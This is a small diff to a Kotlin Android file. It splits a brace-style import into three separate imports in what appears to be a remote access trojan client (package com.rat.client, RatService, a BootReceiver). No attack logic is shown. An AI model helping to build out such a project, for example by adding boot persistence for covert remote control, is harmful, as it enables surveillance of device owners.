@@ -6,7 +6,9 @@ import android.content.Intent
 import android.os.Build
 import android.util.Log
 import com.rat.client.service.RatService
-import com.rat.client.util.{DeviceUtils, PreferencesManager, SystemUtils}
+import com.rat.client.util.DeviceUtils
+import com.rat.client.util.PreferencesManager
+import com.rat.client.util.SystemUtils
 
 class BootReceiver : BroadcastReceiver() {
 
